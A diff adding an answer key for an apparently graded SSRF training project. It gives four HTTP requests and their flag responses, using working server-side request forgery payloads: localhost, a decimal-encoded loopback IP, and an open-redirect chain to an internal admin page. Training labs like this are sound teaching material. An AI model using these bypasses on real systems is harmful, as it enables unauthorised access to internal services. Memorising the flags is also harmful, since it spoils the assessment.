@@ -1,0 +1,97 @@
+
+
+
+******************************************************************
+
+IMPORTANT NOTICE — READ BEFORE CONTINUING:
+
+This file contains the solutions for completing the tasks.  
+Open it ONLY if you have made a genuine, valiant effort to find the solutions  
+by yourself and with your peers. But now the deadline is looming and your   
+grades are stressing you out.  
+
+Take some time to reflect on why your approach didn't work, and understand why this solution does.
+
+Maybe this project just wasn’t the right fit for you.  
+You should look elsewhere for more hands-on exercises to keep practicing and improving on this concept.  
+To help you continue improving, here is a lab you can do to keep practicing.  
+
++ https://portswigger.net/web-security/all-labs#server-side-request-forgery-ssrf
+
+Without further ado, here’s how to complete each task of this project.
+
+******************************************************************	
+
+
+
+
+
+**************************************************************
+TASK 0
+**************************************************************
+Request:
+
+POST /check-reduction HTTP/1.1
+Host: web0x08.hbtn
+Content-Type: application/x-www-form-urlencoded
+
+Body:
+articleApi=http://localhost:3000/admin/list-of-items
+
+Response:
+
+<td>FLAG_0</td>
+<td>4261c26aec228a301f1efad500faec50</td>
+
+**************************************************************
+TASK 1
+**************************************************************
+Request:
+
+POST /app2/check-reduction HTTP/1.1
+Host: web0x08.hbtn
+Content-Type: application/x-www-form-urlencoded
+
+Body:
+articleApi=http://2130706433:3001/admin/list-of-items
+
+Response:
+
+<td>FLAG_1</td>
+<td>ed181fd8379b3c69ddfa97afb1029587</td>
+
+
+**************************************************************
+TASK 2
+**************************************************************
+Request:
+
+POST /app3/check-reduction HTTP/1.1
+Host: web0x08.hbtn
+Content-Type: application/x-www-form-urlencoded
+
+Body:
+articleApi=http://discount.newshop.tn:3002/admin/list-of-items
+
+Response (line 45):
+
+ <td>FLAG_2</td>
+ <td>8990664563c69515b081264872816d94</td>
+
+**************************************************************
+TASK 3
+**************************************************************
+Request:
+
+POST /app4-1/check-discount HTTP/1.1
+Host: web0x08.hbtn
+Content-Type: application/x-www-form-urlencoded
+
+Body:
+articleApi=http://web0x08.hbtn:8080/app4-1/product/nextProduct?path=http://127.0.0.1:8080/admin
+
+Response:
+
+<h1> The goal is achieved, well done. FLAG_3 7f898f77cea2efa3e759239b2258e474</h1>
+
+**************************************************************
